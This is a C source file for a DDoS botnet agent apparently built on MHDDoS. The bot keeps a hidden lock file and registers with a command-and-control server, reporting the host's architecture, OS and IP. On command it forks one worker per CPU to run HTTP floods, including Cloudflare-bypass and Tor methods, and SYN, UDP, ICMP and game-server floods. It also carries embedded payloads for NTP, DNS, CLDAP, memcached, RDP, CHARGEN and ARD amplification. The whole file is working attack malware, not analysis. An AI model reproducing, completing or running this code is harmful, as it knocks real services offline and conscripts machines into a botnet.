#include "mhddos.h"
#include <stdarg.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <sys/resource.h>
#include <sys/mman.h>
#include <sys/stat.h>

#ifndef SERVER_HOST
#define SERVER_HOST "0.0.0.0"
#endif
#ifndef SERVER_PORT
#define SERVER_PORT 8443
#endif
#define RECONNECT_DELAY 5
#define CMD_BUF_SIZE 4096
#define MAX_ARGS 64
#define PID_FILE "/tmp/.mhd.pid"

#ifndef MSG_NOSIGNAL
#define MSG_NOSIGNAL 0
#endif

#ifndef MAP_ANONYMOUS
#define MAP_ANONYMOUS MAP_ANON
#endif

static volatile sig_atomic_t g_child_pid = 0;
static volatile sig_atomic_t g_attack_running = 0;
static volatile sig_atomic_t g_stop_requested = 0;
static int g_server_sock = -1;
static volatile int *g_shared_running = NULL;
static pid_t *g_worker_pids = NULL;
static int g_worker_count = 0;

static int is_pid_alive(pid_t pid) {
    if (pid <= 0) return 0;
    if (kill(pid, 0) == 0) return 1;
    if (errno == EPERM) return 1;
    return 0;
}

static int acquire_lock(void) {
    FILE *f;
    int old_pid = 0;
    f = fopen(PID_FILE, "r");
    if (f) {
        if (fscanf(f, "%d", &old_pid) == 1 && is_pid_alive((pid_t)old_pid)) {
            fclose(f);
            return 0;
        }
        fclose(f);
    }
    f = fopen(PID_FILE, "w");
    if (!f) return 1;
    fprintf(f, "%d\n", (int)getpid());
    fclose(f);
    return 1;
}

static void release_lock(void) {
    unlink(PID_FILE);
}

static int get_num_cpus(void) {
    long n = 1;
#ifdef _SC_NPROCESSORS_ONLN
    n = sysconf(_SC_NPROCESSORS_ONLN);
#endif
    if (n < 1) n = 1;
    if (n > 128) n = 128;
    return (int)n;
}

static void get_arch(char *buf, int len) {
    struct utsname u;
    if (uname(&u) == 0) {
        strncpy(buf, u.machine, len - 1);
        buf[len - 1] = 0;
    } else {
        strcpy(buf, "unknown");
    }
}

static void get_osinfo(char *buf, int len) {
    struct utsname u;
    if (uname(&u) == 0) {
        snprintf(buf, len, "%s %s", u.sysname, u.release);
    } else {
        strcpy(buf, "unknown");
    }
}

static int tcp_connect(const char *host, int port, int timeout_sec) {
    struct sockaddr_in addr;
    struct hostent *he;
    struct timeval tv;
    int sock, flag;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);

    if (inet_aton(host, &addr.sin_addr) == 0) {
        he = gethostbyname(host);
        if (!he) {
            close(sock);
            return -1;
        }
        memcpy(&addr.sin_addr, he->h_addr, he->h_length);
    }

    tv.tv_sec = timeout_sec;
    tv.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(sock);
        return -1;
    }

    tv.tv_sec = 120;
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    flag = 1;
    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &flag, sizeof(flag));

    return sock;
}

static int send_all(int sock, const char *buf, int len) {
    int sent = 0;
    int n;
    while (sent < len) {
        n = send(sock, buf + sent, len - sent, MSG_NOSIGNAL);
        if (n <= 0) {
            if (n < 0 && errno == EINTR) continue;
            return -1;
        }
        sent += n;
    }
    return sent;
}

static int send_line(int sock, const char *fmt, ...) {
    char buf[CMD_BUF_SIZE];
    va_list ap;
    int n;
    va_start(ap, fmt);
    n = vsnprintf(buf, sizeof(buf) - 1, fmt, ap);
    va_end(ap);
    if (n <= 0) return -1;
    buf[n] = '\n';
    return send_all(sock, buf, n + 1);
}

static int recv_line(int sock, char *buf, int buflen) {
    int pos = 0;
    char c;
    int r;
    while (pos < buflen - 1) {
        r = recv(sock, &c, 1, 0);
        if (r < 0) {
            if (errno == EINTR) continue;
            return -1;
        }
        if (r == 0) return -1;
        if (c == '\n') break;
        if (c != '\r') buf[pos++] = c;
    }
    buf[pos] = 0;
    return pos;
}

static volatile int *create_shared_int(void) {
    volatile int *p;
    int fd;
    fd = open("/dev/zero", O_RDWR);
    if (fd >= 0) {
        p = mmap(NULL, sizeof(int), PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
        close(fd);
        if (p != MAP_FAILED) {
            *p = 0;
            return p;
        }
    }
    p = mmap(NULL, sizeof(int), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (p != MAP_FAILED) {
        *p = 0;
        return p;
    }
    p = malloc(sizeof(int));
    if (p) *p = 0;
    return p;
}

static void kill_workers(void) {
    int i;
    if (g_shared_running) *g_shared_running = 0;
    for (i = 0; i < g_worker_count; i++) {
        if (g_worker_pids[i] > 0) {
            kill(g_worker_pids[i], SIGKILL);
        }
    }
    for (i = 0; i < g_worker_count; i++) {
        if (g_worker_pids[i] > 0) {
            waitpid(g_worker_pids[i], NULL, 0);
            g_worker_pids[i] = 0;
        }
    }
    g_worker_count = 0;
}

static void stop_attack(void) {
    if (g_child_pid > 0) {
        kill(g_child_pid, SIGKILL);
        waitpid(g_child_pid, NULL, 0);
        g_child_pid = 0;
    }
    g_attack_running = 0;
}

static void sigchld_fn(int sig) {
    int st;
    pid_t p;
    (void)sig;
    while ((p = waitpid(-1, &st, WNOHANG)) > 0) {
        if (p == g_child_pid) {
            g_child_pid = 0;
            g_attack_running = 0;
        }
    }
}

static void coord_sig_fn(int sig) {
    (void)sig;
    g_stop_requested = 1;
}

static void do_attack(int argc, char **argv);

static void set_amp(layer4_args_t *a, const uint8_t *p, int l, int port) {
    memcpy(a->amp_payload, p, l);
    a->amp_payload_len = l;
    a->amp_port = port;
}

static void run_l7(layer7_args_t *a) {
    switch (a->method) {
        case METHOD_GET: flood_get(a); break;
        case METHOD_POST: flood_post(a); break;
        case METHOD_STRESS: flood_stress(a); break;
        case METHOD_PPS: flood_pps(a); break;
        case METHOD_EVEN: flood_even(a); break;
        case METHOD_OVH: flood_ovh(a); break;
        case METHOD_NULL: flood_null(a); break;
        case METHOD_COOKIE: flood_cookie(a); break;
        case METHOD_APACHE: flood_apache(a); break;
        case METHOD_XMLRPC: flood_xmlrpc(a); break;
        case METHOD_BOT: flood_bot(a); break;
        case METHOD_DYN: flood_dyn(a); break;
        case METHOD_SLOW: flood_slow(a); break;
        case METHOD_CFBUAM: flood_cfbuam(a); break;
        case METHOD_AVB: flood_avb(a); break;
        case METHOD_DOWNLOADER: flood_downloader(a); break;
        case METHOD_RHEX: flood_rhex(a); break;
        case METHOD_STOMP: flood_stomp(a); break;
        case METHOD_GSB: flood_gsb(a); break;
        case METHOD_CFB: flood_cfb(a); break;
        case METHOD_BYPASS: flood_bypass(a); break;
        case METHOD_DGB: flood_dgb(a); break;
        case METHOD_TOR: flood_tor(a); break;
        case METHOD_KILLER: flood_killer(a); break;
        default: flood_get(a); break;
    }
}

static void run_l4(layer4_args_t *a) {
    switch (a->method) {
        case METHOD_TCP: flood_tcp(a); break;
        case METHOD_UDP: flood_udp(a); break;
        case METHOD_SYN: flood_syn(a); break;
        case METHOD_ICMP: flood_icmp(a); break;
        case METHOD_VSE: flood_vse(a); break;
        case METHOD_TS3: flood_ts3(a); break;
        case METHOD_MCPE: flood_mcpe(a); break;
        case METHOD_FIVEM: flood_fivem(a); break;
        case METHOD_FIVEM_TOKEN: flood_fivem_token(a); break;
        case METHOD_OVH_UDP: flood_ovhudp(a); break;
        case METHOD_MINECRAFT: flood_minecraft(a); break;
        case METHOD_CPS: flood_cps(a); break;
        case METHOD_CONNECTION: flood_connection(a); break;
        case METHOD_MCBOT: flood_mcbot(a); break;
        case METHOD_MEM: case METHOD_NTP: case METHOD_DNS_AMP:
        case METHOD_ARD: case METHOD_CLDAP: case METHOD_CHAR:
        case METHOD_RDP: flood_amp(a); break;
        default: break;
    }
}

static void exec_attack(int argc, char **argv) {
    char m[64];
    int i;
    pid_t pid;
    method_t method;

    if (argc < 2) return;
    strncpy(m, argv[1], sizeof(m) - 1);
    m[sizeof(m) - 1] = 0;
    for (i = 0; m[i]; i++) {
        if (m[i] >= 'a' && m[i] <= 'z') m[i] -= 32;
    }
    if (strcmp(m, "STOP") == 0) {
        stop_attack();
        return;
    }
    method = parse_method(m);
    if (method == METHOD_UNKNOWN || argc < 3) return;
    stop_attack();
    pid = fork();
    if (pid < 0) return;
    if (pid == 0) {
        if (g_server_sock >= 0) close(g_server_sock);
        signal(SIGCHLD, SIG_DFL);
        signal(SIGPIPE, SIG_IGN);
        signal(SIGTERM, coord_sig_fn);
        signal(SIGINT, coord_sig_fn);
        do_attack(argc, argv);
        _exit(0);
    }
    g_child_pid = pid;
    g_attack_running = 1;
}

static void do_attack(int argc, char **argv) {
    char m[64];
    char url[4096];
    int i, timer, workers;
    time_t start;
    struct rlimit rl;
    method_t method;
    url_t target;
    char host_ip[256];
    char target_ip[256];
    int port, rpc, proxy_ty;
    char proxy_path[512];
    char **uas = NULL;
    char **refs = NULL;
    int ua_cnt = 0, ref_cnt = 0;
    proxy_t *proxies = NULL;
    int proxy_cnt = 0;
    proxy_type_t pt;
    pid_t wpid;
    int protocolid;

    rl.rlim_cur = 1024;
    rl.rlim_max = 1024;
    setrlimit(RLIMIT_NOFILE, &rl);

    srand((unsigned)(time(NULL) ^ getpid()));
    get_local_ip(g_local_ip, sizeof(g_local_ip));

    strncpy(m, argv[1], sizeof(m) - 1);
    m[sizeof(m) - 1] = 0;
    for (i = 0; m[i]; i++) {
        if (m[i] >= 'a' && m[i] <= 'z') m[i] -= 32;
    }

    method = parse_method(m);
    if (method == METHOD_UNKNOWN) _exit(1);

    workers = get_num_cpus();
    g_shared_running = create_shared_int();
    if (!g_shared_running) _exit(1);
    g_worker_pids = calloc(workers, sizeof(pid_t));
    if (!g_worker_pids) _exit(1);
    g_worker_count = 0;
    g_stop_requested = 0;

    memset(url, 0, sizeof(url));
    strncpy(url, argv[2], sizeof(url) - 1);
    {
        char *p = url;
        while (*p == ' ' || *p == '\t') p++;
        if (strncmp(p, "http", 4) != 0) {
            char tmp[4096];
            snprintf(tmp, sizeof(tmp), "http://%s", p);
            strncpy(url, tmp, sizeof(url) - 1);
        }
    }

    if (is_layer7(method)) {
        if (argc < 7) _exit(1);

        parse_url(url, &target);
        if (strcmp(m, "TOR") != 0) {
            if (!resolve_host(target.host, host_ip, sizeof(host_ip))) _exit(1);
        } else {
            strncpy(host_ip, target.host, sizeof(host_ip));
        }

        proxy_ty = atoi(argv[3]);
        snprintf(proxy_path, sizeof(proxy_path), "files/proxies/%s", argv[4]);
        rpc = atoi(argv[5]);
        timer = atoi(argv[6]);

        ua_cnt = load_lines("files/useragent.txt", &uas, MAX_USERAGENTS);
        ref_cnt = load_lines("files/referers.txt", &refs, MAX_REFERERS);
        if (ua_cnt == 0 || ref_cnt == 0) _exit(1);

        if (proxy_ty != 0) {
            pt = (proxy_type_t)proxy_ty;
            if (pt == PROXY_RANDOM) pt = (proxy_type_t)(1 + (rand() % 3));
            proxy_t *pa = malloc(sizeof(proxy_t) * MAX_PROXIES);
            if (pa) {
                proxy_cnt = load_proxies(proxy_path, pa, MAX_PROXIES, pt);
                if (proxy_cnt > 0) proxies = pa;
                else free(pa);
            }
        }

        *g_shared_running = 1;
        for (i = 0; i < workers; i++) {
            wpid = fork();
            if (wpid < 0) continue;
            if (wpid == 0) {
                layer7_args_t a;
                srand((unsigned)(time(NULL) ^ getpid() ^ i));
                memset(&a, 0, sizeof(a));
                a.target = target;
                strncpy(a.host_ip, host_ip, sizeof(a.host_ip));
                a.method = method;
                a.rpc = rpc;
                a.thread_id = i;
                a.proxies = proxies;
                a.proxy_count = proxy_cnt;
                a.useragents = uas;
                a.useragent_count = ua_cnt;
                a.referers = refs;
                a.referer_count = ref_cnt;
                a.running = g_shared_running;
                a.use_ssl = (strcmp(target.scheme, "https") == 0);
                strncpy(a.local_ip, g_local_ip, sizeof(a.local_ip));
                run_l7(&a);
                _exit(0);
            }
            g_worker_pids[g_worker_count++] = wpid;
        }

        start = time(NULL);
        while (!g_stop_requested && (time(NULL) - start) < timer) {
            usleep(100000);
        }
        *g_shared_running = 0;
        kill_workers();
        _exit(0);

    } else if (is_layer4(method)) {
        if (argc < 4) _exit(1);

        parse_url(url, &target);
        if (!resolve_host(target.host, target_ip, sizeof(target_ip))) _exit(1);
        port = target.port;
        if (port < 1 || port > 65535) _exit(1);
        timer = atoi(argv[3]);

        if ((method == METHOD_SYN || method == METHOD_ICMP || method == METHOD_NTP ||
             method == METHOD_DNS_AMP || method == METHOD_RDP || method == METHOD_CHAR ||
             method == METHOD_MEM || method == METHOD_CLDAP || method == METHOD_ARD) &&
            !check_raw_socket()) _exit(1);

        if (argc >= 5 && strlen(argv[4]) > 0) {
            char *a4 = argv[4];
            if (method == METHOD_NTP || method == METHOD_DNS_AMP || method == METHOD_RDP ||
                method == METHOD_CHAR || method == METHOD_MEM || method == METHOD_CLDAP ||
                method == METHOD_ARD) {
                char rp[512];
                FILE *rf;
                snprintf(rp, sizeof(rp), "files/%s", a4);
                rf = fopen(rp, "r");
                if (rf) {
                    char line[256];
                    refs = malloc(sizeof(char *) * MAX_REFS);
                    while (fgets(line, sizeof(line), rf) && ref_cnt < MAX_REFS) {
                        line[strcspn(line, "\r\n")] = 0;
                        if (strlen(line) > 6) refs[ref_cnt++] = strdup(line);
                    }
                    fclose(rf);
                }
                if (ref_cnt == 0) _exit(1);
            }
        }

        protocolid = MINECRAFT_DEFAULT_PROTOCOL;
        if (method == METHOD_MCBOT) {
            int probe = socket(AF_INET, SOCK_STREAM, 0);
            if (probe >= 0) {
                struct sockaddr_in addr;
                struct timeval tv = {2, 0};
                memset(&addr, 0, sizeof(addr));
                addr.sin_family = AF_INET;
                addr.sin_port = htons(port);
                inet_pton(AF_INET, target_ip, &addr.sin_addr);
                setsockopt(probe, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
                setsockopt(probe, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
                if (connect(probe, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
                    uint8_t hs[1024];
                    int hslen = mc_handshake(target_ip, port, protocolid, 1, hs);
                    send(probe, hs, hslen, 0);
                    uint8_t ping_pkt[16];
                    uint8_t zero = 0x00;
                    int pinglen = mc_data(&zero, 1, ping_pkt);
                    send(probe, ping_pkt, pinglen, 0);
                    uint8_t resp[1024];
                    int rlen = recv(probe, resp, sizeof(resp), 0);
                    if (rlen > 0) {
                        char *pp = strstr((char*)resp, "\"protocol\":");
                        if (pp) {
                            int pv = atoi(pp + 11);
                            if (pv > 47 && pv < 758) protocolid = pv;
                        }
                    }
                }
                close(probe);
            }
        }

        *g_shared_running = 1;
        for (i = 0; i < workers; i++) {
            wpid = fork();
            if (wpid < 0) continue;
            if (wpid == 0) {
                layer4_args_t a;
                srand((unsigned)(time(NULL) ^ getpid() ^ i));
                memset(&a, 0, sizeof(a));
                strncpy(a.target_ip, target_ip, sizeof(a.target_ip));
                a.target_port = port;
                a.method = method;
                a.protocolid = protocolid;
                a.proxies = proxies;
                a.proxy_count = proxy_cnt;
                a.refs = refs;
                a.ref_count = ref_cnt;
                a.running = g_shared_running;
                strncpy(a.local_ip, g_local_ip, sizeof(a.local_ip));
                if (method == METHOD_ICMP) a.target_port = 0;
                if (method == METHOD_RDP) { uint8_t p[] = {0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}; set_amp(&a, p, 16, 3389); }
                else if (method == METHOD_CLDAP) { uint8_t p[] = {0x30,0x25,0x02,0x01,0x01,0x63,0x20,0x04,0x00,0x0a,0x01,0x00,0x0a,0x01,0x00,0x02,0x01,0x00,0x02,0x01,0x00,0x01,0x01,0x00,0x87,0x0b,0x6f,0x62,0x6a,0x65,0x63,0x74,0x63,0x6c,0x61,0x73,0x73,0x30,0x00}; set_amp(&a, p, 39, 389); }
                else if (method == METHOD_MEM) { uint8_t p[] = {0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x00,'g','e','t','s',' ','p',' ','h',' ','e','\n'}; set_amp(&a, p, 19, 11211); }
                else if (method == METHOD_CHAR) { uint8_t p[] = {0x01}; set_amp(&a, p, 1, 19); }
                else if (method == METHOD_ARD) { uint8_t p[] = {0x00,0x14,0x00,0x00}; set_amp(&a, p, 4, 3283); }
                else if (method == METHOD_NTP) { uint8_t p[] = {0x17,0x00,0x03,0x2a,0x00,0x00,0x00,0x00}; set_amp(&a, p, 8, 123); }
                else if (method == METHOD_DNS_AMP) { uint8_t p[] = {0x45,0x67,0x01,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x01,0x02,0x73,0x6c,0x00,0x00,0xff,0x00,0x01,0x00,0x00,0x29,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00}; set_amp(&a, p, 31, 53); }
                run_l4(&a);
                _exit(0);
            }
            g_worker_pids[g_worker_count++] = wpid;
        }

        start = time(NULL);
        while (!g_stop_requested && (time(NULL) - start) < timer) {
            usleep(100000);
        }
        *g_shared_running = 0;
        kill_workers();
        _exit(0);
    }
}

static void handle_cmd(const char *cmd) {
    char buf[CMD_BUF_SIZE];
    char *args[MAX_ARGS];
    int argc = 0;
    char *p;

    if (!cmd || !*cmd) return;
    strncpy(buf, cmd, sizeof(buf) - 1);
    buf[sizeof(buf) - 1] = 0;

    args[argc++] = "x";
    p = buf;
    while (*p && argc < MAX_ARGS) {
        while (*p == ' ' || *p == '\t') p++;
        if (!*p) break;
        args[argc++] = p;
        while (*p && *p != ' ' && *p != '\t') p++;
        if (*p) *p++ = 0;
    }
    if (argc < 2) return;
    exec_attack(argc, args);
}

static void cleanup(void) {
    stop_attack();
    release_lock();
}

int main(int argc, char **argv) {
    const char *host;
    int port;
    char arch[64], osinfo[256];
    struct sigaction sa;
    int sock, n;
    char cmd[CMD_BUF_SIZE];

    if (!acquire_lock()) _exit(0);
    atexit(cleanup);

    host = SERVER_HOST;
    port = SERVER_PORT;
    if (argc >= 2) host = argv[1];
    if (argc >= 3) port = atoi(argv[2]);

    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = sigchld_fn;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = SA_RESTART;
    sigaction(SIGCHLD, &sa, NULL);
    signal(SIGPIPE, SIG_IGN);

    srand((unsigned)(time(NULL) ^ getpid()));
    get_local_ip(g_local_ip, sizeof(g_local_ip));
    get_arch(arch, sizeof(arch));
    get_osinfo(osinfo, sizeof(osinfo));

    while (1) {
        sock = tcp_connect(host, port, 10);
        g_server_sock = sock;
        if (sock < 0) {
            sleep(RECONNECT_DELAY);
            continue;
        }

        if (send_line(sock, "HELLO|%s|%s|%s", arch, osinfo, g_local_ip) < 0) {
            close(sock);
            sleep(RECONNECT_DELAY);
            continue;
        }

        while (1) {
            n = recv_line(sock, cmd, sizeof(cmd));
            if (n < 0) break;
            if (n == 0) continue;

            if (strcmp(cmd, "PING") == 0) {
                if (send_line(sock, "PONG|%s|%d", arch, g_attack_running ? 1 : 0) < 0) break;
            } else if (strcmp(cmd, "STOP") == 0) {
                stop_attack();
                send_line(sock, "STATUS|stopped");
            } else if (strncmp(cmd, "ATTACK|", 7) == 0) {
                handle_cmd(cmd + 7);
                send_line(sock, "STATUS|attacking");
            } else {
                handle_cmd(cmd);
            }
        }

        close(sock);
        stop_attack();
        sleep(RECONNECT_DELAY);
    }

    return 0;
}